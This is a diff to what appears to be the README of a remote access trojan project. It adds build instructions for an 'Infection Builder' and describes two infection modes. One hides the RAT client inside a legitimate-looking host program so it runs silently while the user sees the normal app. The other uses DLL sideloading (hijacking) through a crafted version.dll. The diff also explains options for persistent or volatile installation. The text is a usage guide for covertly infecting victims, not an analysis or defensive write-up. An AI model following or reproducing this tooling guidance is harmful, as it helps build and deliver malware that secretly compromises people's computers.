@@ -9,9 +9,38 @@ You need to have project’s source code and the the following tools installed:
 
 # Compiling
 
-To begin, navigate to the root folder of the project and access the server folder. Launch a command prompt there. For compiling both the client and the server, use the command `cargo build`, which by default builds the source code in debug mode. To compile in release mode, add the `--release` parameter to the build command.  
-Since we are using a cargo workspace, use the `-p` parameter (short for `--package`) to specify whether to compile the client or the server.  
-Compile the client and the server in debug mode with the following commands: `cargo build -p client` and `cargo build -p server`. The compiled binaries will be located under the target folder, which contains both release and debug folders.
+To begin, navigate to the root folder of the project. For compiling the client, server, and stubs, use the command `cargo build`, which by default builds the source code in debug mode. To compile in release mode, add the `--release` parameter.
+
+### Build Order (Important for Infection Builder)
+If you plan to use the Infection Builder, follow this build order:
+
+1.  **Client**: `cargo build -p client --release`
+2.  **Stubs**:
+    -   `cargo build -p dll_stub --release` (This creates the loader DLL)
+    -   `cargo build -p binder_stub --release` (This creates the bundling executable)
+3.  **Prepare Stubs**: Copy the compiled stubs from `target/release/` to `server/src-tauri/res/`:
+    -   `target/release/dll_stub.dll` -> `server/src-tauri/res/dll_stub.dll`
+    -   `target/release/binder_stub.exe` -> `server/src-tauri/res/binder_stub.exe`
+4.  **Server**: `cargo build -p server --release` (or use `npm run tauri build` for a full installer)
+
+The compiled binaries will be located under the `target` folder.
+
+# Infection Modes
+
+The Infection Builder (found in Settings -> Client Builder -> Infect) offers two primary methods:
+
+### 1. Single File (Bundled)
+This mode creates a single `.exe` file that contains both your selected host application (e.g., a calculator) and the RAT client.
+- **Functionality**: When the user runs the bundled file, it extracts the host and a loader DLL to a temporary directory and launches them.
+- **User Experience**: The user sees the original application running as expected, while the client runs silently in the background.
+
+### 2. Sideload (2 Files)
+This mode prepares a directory containing the original host executable and a specially crafted loader DLL (e.g., `version.dll`).
+- **Functionality**: It relies on standard Windows DLL search order (DLL hijacking). When the host EXE is launched, it automatically loads the DLL in the same directory, which then executes the RAT client.
+
+**Volatile vs. Persistent**:
+- If "Install" is **enabled** in the builder, the client will attempt to install itself permanently on the system.
+- If "Install" is **disabled**, the client runs in **Volatile Mode**. In this mode, the client is tied to the host's lifecycle; if the host application is closed or crashes, the client will be automatically terminated (using Windows Job Objects).
 
 # Releasing for production
 
